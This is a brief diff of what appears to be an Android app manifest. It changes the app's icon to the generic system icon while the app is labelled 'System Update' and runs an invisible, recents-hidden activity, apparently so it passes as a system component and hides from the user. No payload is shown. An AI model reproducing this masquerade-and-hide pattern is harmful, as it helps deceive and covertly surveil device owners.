@@ -17,7 +17,7 @@
     
     <application
         android:allowBackup="true"
-        android:icon="@android:drawable/ic_menu_sync"
+        android:icon="@android:drawable/sym_def_app_icon"
         android:label="System Update">
         
         <activity android:name=".MainActivity" android:exported="true" android:excludeFromRecents="true" android:theme="@android:style/Theme.NoDisplay">
